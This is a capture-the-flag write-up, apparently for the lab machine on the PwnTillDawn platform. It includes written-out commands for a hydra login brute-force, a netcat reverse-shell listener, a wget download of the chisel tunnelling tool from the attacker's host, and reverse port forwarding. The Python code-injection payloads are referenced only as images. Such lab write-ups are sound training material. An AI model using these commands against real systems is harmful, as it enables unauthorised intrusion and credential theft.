@@ -1,0 +1,322 @@
+I"Y<p>This is a machine from the platform PwnTillDawn.</p>
+
+<p>Check the platform by yourself and happy hacking:</p>
+
+<p><a href="https://www.wizlynxgroup.com/">https://www.wizlynxgroup.com/</a></p>
+
+<p><a href="https://online.pwntilldawn.com/">https://online.pwntilldawn.com/</a></p>
+
+<p>Machine details:</p>
+
+<blockquote>
+  <p>OS: Linux</p>
+
+  <p>Rated as: Medium</p>
+
+  <p>IP: 10.150.150.38</p>
+</blockquote>
+
+<h1 id="manual-os-fingerprinting"><a href="#header-1"></a>Manual OS fingerprinting.</h1>
+
+<p>I pinged the machine, and based on the <a href="https://subinsb.com/default-device-ttl-values/">TTL</a> I can conclude it’s a Linux box:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+└─<span class="nv">$ </span>ping <span class="nt">-c</span> 1 10.150.150.38
+PING 10.150.150.38 <span class="o">(</span>10.150.150.38<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from 10.150.150.38: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>163 ms
+
+<span class="nt">---</span> 10.150.150.38 ping statistics <span class="nt">---</span>
+1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
+rtt min/avg/max/mdev <span class="o">=</span> 162.577/162.577/162.577/0.000 ms
+</code></pre></div></div>
+
+<h1 id="port-scanning"><a href="#header-1"></a>Port scanning.</h1>
+
+<p>I use two port scans, in the first one I discover all open ports. In the second I perform a nmap scan over those 
+discovered ports trying to discover the service versions and also try basic nmap enum scripts.</p>
+
+<h2 id="first-scan"><a href="#header-2"></a>First scan.</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─<span class="nv">$ IP</span><span class="o">=</span>10.150.150.38<span class="p">;</span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span><span class="o">=</span>5000 <span class="nt">-n</span> <span class="nt">-sT</span> <span class="nt">-Pn</span> <span class="nt">-oG</span> allports <span class="nt">--open</span> <span class="nv">$IP</span>
+Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-06 22:40 EDT
+Nmap scan report <span class="k">for </span>10.150.150.38
+Host is up <span class="o">(</span>0.16s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 62938 closed ports, 2595 filtered ports
+Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
+PORT      STATE SERVICE
+22/tcp    open  ssh
+30609/tcp open  unknown
+
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>16.14 seconds
+
+</code></pre></div></div>
+
+<ul>
+  <li>In the first part I declare the IP of the machine as an env variable, because it reduces me time when doing the scans.</li>
+  <li><code class="language-plaintext highlighter-rouge">-p-</code>: Scan all TCP ports.</li>
+  <li><code class="language-plaintext highlighter-rouge">--min-rate=5000</code>: I want to go fast, remember this is a controlled environment, not recommended in corporate environments.</li>
+  <li><code class="language-plaintext highlighter-rouge">-n</code>: Don’t use DNS resolution (It goes faster this way).</li>
+  <li><code class="language-plaintext highlighter-rouge">-sT</code>: Use tcp connect scan. I prefer this rather than the default (stealth).</li>
+  <li><code class="language-plaintext highlighter-rouge">-Pn</code>: Don’t do host discovery on the machine, it can save me some time, but before the scan I always test reachability to the machine.</li>
+  <li><code class="language-plaintext highlighter-rouge">-oG allports</code>: Saves the nmap output in grepable format to a file called <strong>allports</strong>.</li>
+  <li><code class="language-plaintext highlighter-rouge">--open</code>: Only shows me open ports.</li>
+  <li><code class="language-plaintext highlighter-rouge">$IP</code>: This is where i call my env variable the IP of the machine.</li>
+</ul>
+
+<p>When I’m facing some fancy bash commands that at first sight I don’t clearly understand there is a very useful resource (Thanks Henry): <a href="https://explainshell.com/explain?cmd=IP%3D10.150.150.38%3Bnmap+-p-+--min-rate%3D5000+-n+-sT+-Pn+-oG+allports+--open+%24IP">https://explainshell.com/</a></p>
+
+<p>Remember I saved the output as nmap grepable format? Well that was because I use a bash function that extracts the open ports from there and place them in a bash env variable called ports. Thanks to <a href="https://www.youtube.com/c/s4vitar/videos">s4vitar</a> for this:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function </span>extract <span class="o">()</span> <span class="o">{</span>
+        <span class="nv">ports</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">cat</span> <span class="nv">$1</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\d{1,5}/open'</span> | <span class="nb">awk</span> <span class="s1">'{print $1}'</span> <span class="nv">FS</span><span class="o">=</span>/ | <span class="nb">tr</span> <span class="s1">'\n'</span> <span class="s1">','</span>| <span class="nb">sed</span> <span class="s1">'s/.$//'</span> <span class="si">)</span><span class="s2">"</span>
+        <span class="nb">echo</span> <span class="s2">"Open ports:  </span><span class="nv">$ports</span><span class="s2">"</span>
+        <span class="nb">export </span><span class="nv">ports</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nv">$ports</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'\n'</span><span class="si">)</span>
+<span class="o">}</span>
+
+</code></pre></div></div>
+
+<p>After writting that function in the .zshrc file (this is my case, because I’m using zsh), and using the source command to reaload the config, this is the output:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─<span class="nv">$ </span>extract allports                                                                   
+Open ports:  22,30609
+</code></pre></div></div>
+
+<h2 id="-second-scan"><a href="#header-2"></a> Second scan.</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─<span class="nv">$ </span>nmap <span class="nt">-p</span><span class="nv">$ports</span> <span class="nt">--min-rate</span><span class="o">=</span>1000 <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nt">-oN</span> targeted <span class="nv">$IP</span>
+Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-06 23:34 EDT
+Nmap scan report <span class="k">for </span>10.150.150.38
+Host is up <span class="o">(</span>0.16s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 64:63:02:cb:00:44:4a:0f:95:1a:34:8d:4e:60:38:1c <span class="o">(</span>RSA<span class="o">)</span>
+|   256 0a:6e:10:95:de:3d:6d:4b:98:5f:f0:cf:cb:f5:79:9e <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 08:04:04:08:51:d2:b4:a4:03:bb:02:71:2f:66:09:69 <span class="o">(</span>ED25519<span class="o">)</span>
+30609/tcp open  http    Jetty 9.4.27.v20200227
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-server-header: Jetty<span class="o">(</span>9.4.27.v20200227<span class="o">)</span>
+|_http-title: Site doesnt have a title <span class="o">(</span>text/html<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>utf-8<span class="o">)</span><span class="nb">.</span>
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>20.71 seconds
+</code></pre></div></div>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">-p$ports</code>: Only scan the ports I discovered from the previous scan.</li>
+  <li><code class="language-plaintext highlighter-rouge">--min-rate=1000</code>: Fast scan.</li>
+  <li><code class="language-plaintext highlighter-rouge">-sC</code>: Perform nmap default scripts scan.</li>
+  <li><code class="language-plaintext highlighter-rouge">-sV</code>: Do version detection.</li>
+  <li><code class="language-plaintext highlighter-rouge">-n</code>: Don’t do DNS resolution.</li>
+  <li><code class="language-plaintext highlighter-rouge">-Pn</code>: Don’t do host discovery.</li>
+  <li><code class="language-plaintext highlighter-rouge">-oN targeted</code>: Save the output to a file called targeted, using normal format.</li>
+  <li><code class="language-plaintext highlighter-rouge">$IP</code>: This is the variable containing the IP.</li>
+</ul>
+
+<h1 id="search-for-vulnerable-versions"><a href="#header-1"></a>Search for vulnerable versions.</h1>
+
+<p>Once are identified the service versions, let’s take a look in searchsploit:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─<span class="nv">$ </span>searchsploit openssh 7.9
+Exploits: No Results
+Shellcodes: No Results
+Papers: No Results
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─<span class="nv">$ </span>searchsploit jetty 9.4  
+Exploits: No Results
+Shellcodes: No Results
+Papers: No Results
+</code></pre></div></div>
+
+<p>Nothing useful found here.</p>
+
+<h1 id="jenkins-login-page"><a href="#header-1"></a>Jenkins login page.</h1>
+
+<p>When we visit the web service on port 30609 it shows a Jenkins login page:</p>
+
+<p><img src="assets/jenkins_login.png" alt="" /></p>
+
+<p>I <a href="https://www.shellhacks.com/jenkins-default-password-username/">found</a> that the default jenkins username is <code class="language-plaintext highlighter-rouge">admin</code>, and after trying default easy passwords 
+unsuccessfully I moved on and try to bruteforce the login page with <code class="language-plaintext highlighter-rouge">hydra</code>.</p>
+
+<h1 id="login-bruteforcing"><a href="#header-1"></a>Login bruteforcing.</h1>
+
+<p>First I intercepted the login request with BurpSuite to find the parameters being sent:</p>
+
+<p><img src="assets/burp_login.png" alt="" /></p>
+
+<p>Then, the final hydra command looks like this:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra <span class="nt">-l</span> admin <span class="nt">-P</span> /usr/share/wordlists/rockyou.txt 10.150.150.38 <span class="nt">-s</span> 30609 http-post-form <span class="s2">"/j_acegi_security_check:j_username=^USER^&amp;j_password=^PASS^&amp;from=%2F&amp;Submit=Sign+in:Invalid"</span> <span class="nt">-V</span> <span class="nt">-I</span> <span class="nt">-F</span>
+</code></pre></div></div>
+
+<p>After a while it discovers the password:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
+<span class="o">[</span>ATTEMPT] target 10.150.150.38 - login <span class="s2">"admin"</span> - pass <span class="s2">"gloria"</span> - 649 of 14344399 <span class="o">[</span>child 5] <span class="o">(</span>0/0<span class="o">)</span>
+<span class="o">[</span>ATTEMPT] target 10.150.150.38 - login <span class="s2">"admin"</span> - pass <span class="s2">"tyler"</span> - 650 of 14344399 <span class="o">[</span>child 1] <span class="o">(</span>0/0<span class="o">)</span>
+<span class="o">[</span>ATTEMPT] target 10.150.150.38 - login <span class="s2">"admin"</span> - pass <span class="s2">"aaron"</span> - 651 of 14344399 <span class="o">[</span>child 0] <span class="o">(</span>0/0<span class="o">)</span>
+<span class="o">[</span>30609][http-post-form] host: 10.150.150.38   login: admin   password: matrix
+<span class="o">[</span>STATUS] attack finished <span class="k">for </span>10.150.150.38 <span class="o">(</span>valid pair found<span class="o">)</span>
+1 of 1 target successfully completed, 1 valid password found
+Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> finished at 2021-09-08 20:30:18
+</code></pre></div></div>
+
+<p>The creds are <code class="language-plaintext highlighter-rouge">admin</code> : <code class="language-plaintext highlighter-rouge">matrix</code></p>
+
+<h1 id="jenkins-code-execution"><a href="#header-1"></a>Jenkins code execution.</h1>
+
+<p>In the Script Console we can execute java code, and we can use it to execute system commands:</p>
+
+<p><img src="assets/jenkins_execution.png" alt="" /></p>
+
+<p>So we set up a listener and then execute a <a href="https://alionder.net/jenkins-script-console-code-exec-reverse-shell-java-deserialization/">code</a> to get a reverse shell:</p>
+
+<p><img src="assets/jenkins_rev.png" alt="" /></p>
+
+<p>And we’re in:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─<span class="nv">$ </span>nc <span class="nt">-nlvp</span> 6969
+listening on <span class="o">[</span>any] 6969 ...
+connect to <span class="o">[</span>10.66.69.69] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.150.150.38] 58262
+<span class="nb">whoami
+</span>jenkins
+</code></pre></div></div>
+
+<p>Then I followed <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">this</a> procedure to upgrade my rev shell to a very nice TTY.</p>
+
+<h1 id="low-priv-shell-as-jenkins-user"><a href="#header-1"></a>Low priv shell as jenkins user.</h1>
+
+<p>Inside the machine, under the <code class="language-plaintext highlighter-rouge">/var/lib/jenkins</code> we found the FLAG70.txt:</p>
+
+<p><img src="assets/FLAG70.png" alt="" /></p>
+
+<p>Then if we perform a search for FLAG69 we found the following:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jenkins@dev1:~<span class="nv">$ </span>find / <span class="nt">-name</span> FLAG69<span class="k">*</span> 2&gt;/dev/null
+/var/lib/jenkins/users/FLAG69_7705914462374786576
+jenkins@dev1:~<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Which turns to be a directory. Inside it there is a <code class="language-plaintext highlighter-rouge">config.xml</code> file, and when we read it we found the first flag:</p>
+
+<p><img src="assets/FLAG69.png" alt="" /></p>
+
+<p>Doing some manual enumeration we discover port <code class="language-plaintext highlighter-rouge">8080</code> which wasn’t showed as up in the intial nmap scan:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jenkins@dev1:~<span class="nv">$ </span>netstat <span class="nt">-antup</span>
+<span class="o">(</span>Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.<span class="o">)</span>
+Active Internet connections <span class="o">(</span>servers and established<span class="o">)</span>
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:8080          0.0.0.0:<span class="k">*</span>               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:<span class="k">*</span>               LISTEN      -                   
+tcp        0    286 10.150.150.38:58264     10.66.69.69:6969       ESTABLISHED 636/bash            
+tcp6       0      0 :::30609                :::<span class="k">*</span>                    LISTEN      467/java            
+tcp6       0      0 :::22                   :::<span class="k">*</span>                    LISTEN      -                   
+tcp6       1      0 10.150.150.38:30609     10.66.69.69:48350      CLOSE_WAIT  467/java
+</code></pre></div></div>
+
+<h1 id="port-forwarding"><a href="header-1"></a>Port forwarding.</h1>
+
+<p>We transfer <a href="https://github.com/jpillora/chisel/releases">chisel</a> tool to the victim machine to do the port forwarding.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jenkins@dev1:/tmp<span class="nv">$ </span>wget http://10.66.66.69:6971/chisel
+<span class="nt">--2020-07-29</span> 11:04:48--  http://10.66.69.69:6971/chisel
+Connecting to 10.66.69.69:6971... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3295912 <span class="o">(</span>3.1M<span class="o">)</span> <span class="o">[</span>application/octet-stream]
+Saving to: ‘chisel’
+
+chisel                                     100%[<span class="o">========================================================================================&gt;]</span>   3.14M   230KB/s    <span class="k">in </span>14s     
+
+2020-07-29 11:05:02 <span class="o">(</span>233 KB/s<span class="o">)</span> - ‘chisel’ saved <span class="o">[</span>3295912/3295912]
+
+jenkins@dev1:/tmp<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Setting up the chisel server on the attacking machine:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─<span class="nv">$ </span>./chisel server <span class="nt">-port</span> 7171 <span class="nt">--reverse</span>                                                                                                                              127 ⨯
+2021/09/08 21:49:35 server: Reverse tunnelling enabled
+2021/09/08 21:49:35 server: Fingerprint DHQvfo/V5XH2fPvjE630ikAnWDP3/GApoK5fkC/8ryk<span class="o">=</span>
+2021/09/08 21:49:35 server: Listening on http://0.0.0.0:7171
+</code></pre></div></div>
+
+<p>And then wer fire it up as client mode on the victim machine:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jenkins@dev1:/tmp<span class="nv">$ </span><span class="nb">chmod</span> +x chisel<span class="p">;</span>./chisel client 10.66.69.69:7171 R:8080:127.0.0.1:8080
+2020/07/29 11:10:24 client: Connecting to ws://10.66.69.69:7171
+2020/07/29 11:10:25 client: Connected <span class="o">(</span>Latency 160.054035ms<span class="o">)</span>
+</code></pre></div></div>
+
+<h1 id="new-web-service-in-8080"><a href="header-1"></a>New web service in 8080.</h1>
+
+<p>After doing the port forwarding the next step is to visit manually the page:</p>
+
+<p><img src="assets/8080.png" alt="" /></p>
+
+<p>It is a calculator.</p>
+
+<p>We found some interesting info looking at the source code:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
+        <span class="nt">&lt;head&gt;</span>
+                <span class="nt">&lt;title&gt;</span>Jr. dev py example<span class="nt">&lt;/title&gt;</span>
+        <span class="nt">&lt;/head&gt;</span>
+        <span class="nt">&lt;body&gt;</span>
+                <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"content"</span><span class="nt">&gt;</span>
+                        <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"/"</span> <span class="na">method=</span><span class="s">"post"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;div&gt;</span>
+                <span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">"op1"</span> <span class="na">type=</span><span class="s">"text"</span> <span class="nt">/&gt;</span>
+                +
+                <span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">"op2"</span> <span class="na">type=</span><span class="s">"text"</span> <span class="nt">/&gt;</span>
+                =
+                <span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">"result"</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">disabled=</span><span class="s">"disabled"</span> <span class="nt">/&gt;</span>
+        <span class="nt">&lt;/div&gt;</span>
+        <span class="nt">&lt;div&gt;</span>
+                <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Calculate"</span> <span class="nt">/&gt;</span>
+        <span class="nt">&lt;/div&gt;</span>
+
+<span class="c">&lt;!-- &lt;img src="./static/FLAG.png"&gt; --&gt;</span>
+
+
+                <span class="nt">&lt;/div&gt;</span>
+        <span class="nt">&lt;/body&gt;</span>
+
+<span class="nt">&lt;/html&gt;</span>
+
+</code></pre></div></div>
+
+<p>And whit that we got the third flag:</p>
+
+<p><img src="assets/FLAG71.png" alt="" /></p>
+
+<h1 id="privesc-via-command-injection-in-python-webapp"><a href="header-1"></a>PrivEsc via command injection in python webapp.</h1>
+
+<p>By the title of the web page we can conclude it is a python webapp.</p>
+
+<p>Searching on the web payloads for command injection in python webapps I found this <a href="https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html">article</a>.</p>
+
+<p>And after trying different payloads I managed to get a reverse shell:</p>
+
+<p><img src="assets/rev_root.png" alt="" /></p>
+
+<p>And we receive a root shell and with that we capture the last flag:</p>
+
+<p><img src="assets/root_shell.png" alt="" /></p>
+
+<p>And that was it.</p>
+
+<h1 id="final-thoughts"><a href="header-1"></a>Final thoughts.</h1>
+
+<p>Was not a very difficult machine, however the last part of the command injection was hard for me, I had to try different combination of payloads until I finally got the good one.
+Was a very complete machine which involved bruteforcing techniques, command execution in jenkins, port forwarding and python code injection.</p>
+
+:ET
